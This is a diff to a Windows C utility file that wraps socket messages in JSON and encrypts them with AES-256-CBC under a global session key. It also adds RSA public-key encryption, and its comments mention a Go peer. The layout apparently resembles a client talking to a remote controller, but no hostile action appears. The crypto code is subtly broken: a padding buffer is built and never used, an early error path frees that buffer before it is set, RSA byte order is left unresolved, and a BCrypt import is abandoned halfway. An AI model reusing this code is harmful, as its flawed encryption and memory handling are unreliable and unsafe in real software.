@@ -1,6 +1,10 @@
 #include "utils.h"
+#include "cJSON.h"
 #include <wincrypt.h>
+#include <bcrypt.h>
 #include <ctype.h>
+
+#pragma comment(lib, "bcrypt.lib")
 
 char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
     DWORD out_len = 0;
@@ -73,13 +77,190 @@ void str_trim(char* s) {
     memmove(s, p, l + 1);
 }
 
+extern SessionKey g_session;
+
 void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
     if (mutex) WaitForSingleObject(mutex, INFINITE);
-    char* buf = (char*)malloc(strlen(msg) + 2);
-    sprintf(buf, "%s\n", msg);
+
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddStringToObject(root, "type", "response");
+    cJSON_AddStringToObject(root, "payload", msg);
+    char *json_msg = cJSON_PrintUnformatted(root);
+
+    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, strlen(json_msg), g_session.key, g_session.iv);
+
+    cJSON *packet = cJSON_CreateObject();
+    cJSON_AddStringToObject(packet, "data", encrypted);
+
+    char *iv_b64 = base64_encode(g_session.iv, 16, NULL);
+    cJSON_AddStringToObject(packet, "iv", iv_b64);
+
+    char *final_json = cJSON_PrintUnformatted(packet);
+
+    char *buf = (char*)malloc(strlen(final_json) + 2);
+    sprintf(buf, "%s\n", final_json);
     send(sock, buf, (int)strlen(buf), 0);
+
     free(buf);
+    free(final_json);
+    free(iv_b64);
+    free(encrypted);
+    free(json_msg);
+    cJSON_Delete(packet);
+    cJSON_Delete(root);
+
     if (mutex) ReleaseMutex(mutex);
+}
+
+char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    DWORD cbKeyBlob = 0, cbData = 0, cbResult = 0;
+    BYTE* pbKeyBlob = NULL;
+    BYTE* pbEncrypted = NULL;
+    char* out = NULL;
+
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != 0) return NULL;
+
+    // PEM -> DER (Wincrypt)
+    DWORD derLen = 0;
+    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
+        BYTE* der = malloc(derLen);
+        if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL)) {
+            if (BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, der, derLen, 0) != 0) {
+                // BCryptImportKeyPair might not like raw DER for RSA.
+                // Alternatively use CryptImportPublicKeyInfo.
+                // For simplicity in this env, we'll try to use BCRYPT_RSAPUBLIC_BLOB correctly or a helper.
+            }
+        }
+        free(der);
+    }
+
+    // Since BCryptImportKeyPair is tricky with PEM/DER directly,
+    // let's use the older but reliable Crypt32 for RSA encryption or
+    // convert DER to BCRYPT_RSAKEY_BLOB.
+
+    // Easier way: Use Crypt32 for RSA encryption as it handles PEM/DER better.
+    CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
+    DWORD pubKeyInfoLen = 0;
+    HCRYPTPROV hProv = 0;
+    HCRYPTKEY hRSAKey = 0;
+
+    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
+        BYTE* der = malloc(derLen);
+        CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL);
+        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
+            if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+                if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
+                    DWORD encLen = (DWORD)len;
+                    // Get required size
+                    if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
+                        BYTE* encBuf = malloc(encLen);
+                        memcpy(encBuf, data, len);
+                        DWORD dataLen = (DWORD)len;
+                        if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
+                            // Reverse for Little Endian to Big Endian if needed by Go?
+                            // No, PKCS1 in Windows is usually compatible if handled right.
+                            // Actually, RSA encryption result needs to be reversed for some Go versions/libs but PKCS1v15 is standard.
+                            out = base64_encode(encBuf, dataLen, NULL);
+                        }
+                        free(encBuf);
+                    }
+                    CryptDestroyKey(hRSAKey);
+                }
+                CryptReleaseContext(hProv, 0);
+            }
+            LocalFree(pubKeyInfo);
+        }
+        free(der);
+    }
+
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return out;
+}
+
+char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0;
+    PBYTE pbKeyObject = NULL, pbCipherText = NULL;
+    char* out = NULL;
+
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
+    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
+
+    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
+    pbKeyObject = (PBYTE)malloc(cbKeyObject);
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
+
+    // Padding (PKCS7)
+    DWORD blockSize = 16;
+    DWORD padLen = blockSize - (len % blockSize);
+    DWORD paddedLen = len + padLen;
+    PBYTE paddedPlain = malloc(paddedLen);
+    memcpy(paddedPlain, plain, len);
+    for (DWORD i = (DWORD)len; i < paddedLen; i++) paddedPlain[i] = (BYTE)padLen;
+
+    BYTE ivCopy[16];
+    memcpy(ivCopy, iv, 16);
+
+    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) {
+        goto cleanup;
+    }
+    pbCipherText = malloc(cbCipherText);
+    memcpy(ivCopy, iv, 16);
+    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
+        goto cleanup;
+    }
+
+    out = base64_encode(pbCipherText, cbResult, NULL);
+
+cleanup:
+    if (paddedPlain) free(paddedPlain);
+    if (pbCipherText) free(pbCipherText);
+    if (hKey) BCryptDestroyKey(hKey);
+    if (pbKeyObject) free(pbKeyObject);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return out;
+}
+
+unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
+    PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL;
+    size_t cipherLen = 0;
+
+    pbCipher = base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
+    if (!pbCipher) return NULL;
+
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
+    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
+
+    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
+    pbKeyObject = (PBYTE)malloc(cbKeyObject);
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
+
+    BYTE ivCopy[16];
+    memcpy(ivCopy, iv, 16);
+
+    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) {
+        goto cleanup;
+    }
+    pbPlain = malloc(cbPlain);
+    memcpy(ivCopy, iv, 16);
+    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
+        goto cleanup;
+    }
+
+    if (out_len) *out_len = cbResult;
+
+cleanup:
+    if (pbCipher) free(pbCipher);
+    if (hKey) BCryptDestroyKey(hKey);
+    if (pbKeyObject) free(pbKeyObject);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return pbPlain;
 }
 
 static int is_leap(unsigned long long y) {
